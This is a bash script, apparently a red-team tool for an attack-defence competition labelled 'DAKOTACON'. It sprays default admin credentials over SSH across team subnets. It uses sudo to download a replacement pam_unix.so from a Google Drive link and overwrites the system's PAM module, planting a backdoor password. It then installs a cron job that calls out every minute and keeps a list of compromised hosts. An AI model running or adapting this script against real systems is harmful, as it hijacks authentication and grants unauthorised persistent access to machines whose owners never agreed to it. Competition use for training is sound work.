#!/bin/bash

network_id="10.10"
number_of_teams=10
host_ids=(10 20 30 40 50)
admins=("admin1" "admin2" "admin3")
default_password="Password1!"
backdoor_password="yuh"
IPs=()
timeout_duration=1
scoring_link="https://..."
backdoor_link="https://drive.usercontent.google.com/download?id=1N_yXow9zudcE48qK1vUsuJPJZOSVMvGh&export=download&authuser=0"

touch backdoored_IPs.txt



send_backdoor() {
    for IP in "${IPs[@]}"; do
        for admin in "${admins[@]}"; do
            sshpass -p "$default_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$admin@$IP" "
                echo \"$default_password\" | sudo -S apt install curl
                echo \"$default_password\" | sudo -S curl -o /tmp/pam_unix.so $backdoor_link
                echo \"$default_password\" | sudo -S mv /tmp/pam_unix.so /usr/lib/x86_64-linux-gnu/security/pam_unix.so
            "

            if [[ $? -eq 0 ]]; then
                if ! grep -q "$IP" backdoored_IPs.txt; then
                    echo "$IP" >> backdoored_IPs.txt
                    echo "Backdoor successfully implanted at $IP"
                fi
                break
            fi
        done
    done
}

send_persistence() {
    read -p "Team to Send Persistence to: " team_number
    count=0

    while IFS= read -r IP; do
        team_number_from_IP=$(echo "$IP" | cut -d'.' -f3)

        if [[ "$team_number_from_IP" == "$team_number" ]]; then
            for admin in "${admins[@]}"; do
                sshpass -p "$backdoor_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$admin@$IP" "
                    echo \"$backdoor_password\" | sudo -S (crontab -l; echo "* * * * * curl $scoring_link") | crontab -
                "

                if [[ $? -eq 0 ]]; then
                    count=$((count + 1))
                    break
                fi
            done
        fi
    done < backdoored_IPs.txt

    echo "Number of successful persistences: $count"
}

stop_sending_persistence() {
    read -p "Team to Stop Sending Persistence to: " team_number
    count=0

    while IFS= read -r IP; do
        team_number_from_IP=$(echo "$IP" | cut -d'.' -f3)

        if [[ "$team_number_from_IP" == "$team_number" ]]; then
            for admin in "${admins[@]}"; do
                sshpass -p "$backdoor_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$admin@$IP" "
                    echo \"$backdoor_password\" | sudo -S echo "Hello"
                "

                if [[ $? -eq 0 ]]; then
                    count=$((count + 1))
                    break
                fi
            done
        fi
    done < backdoored_IPs.txt

    echo "Number of successful stopped persistences: $count"
}

print_backdoored_IPs() {
    echo "Backdoored IPs:"
    cat backdoored_IPs.txt
}

print_unbackdoored_IPs() {
    echo "Unbackdoored IPs:"
    for IP in "${IPs[@]}"; do
        if ! grep -q "$IP" backdoored_IPs.txt; then
            echo "$IP"
        fi
    done
}

main() {
    for ((team=1; team<=number_of_teams; team++)); do
        for host_id in "${host_ids[@]}"; do
            IPs+=("$network_id.$team.$host_id")
        done
    done

    while true; do
        echo "DAKOTACON SCRIPTS"
        echo "1. Send Backdoor"
        echo "2. Send Persistence"
        echo "3. Stop Sending Persistence"
        echo "4. Print Backdoored IPs"
        echo "5. Print Unbackdoored IPs"
        echo "6. Exit"
        read -p "Choose an option: " choice

        case $choice in
            1) send_backdoor ;;
            2) send_persistence ;;
            3) stop_sending_persistence ;;
            4) print_backdoored_IPs ;;
            5) print_unbackdoored_IPs ;;
            6) break ;;
            *) echo "Invalid choice. Please try again." ;;
        esac
    done
}

main
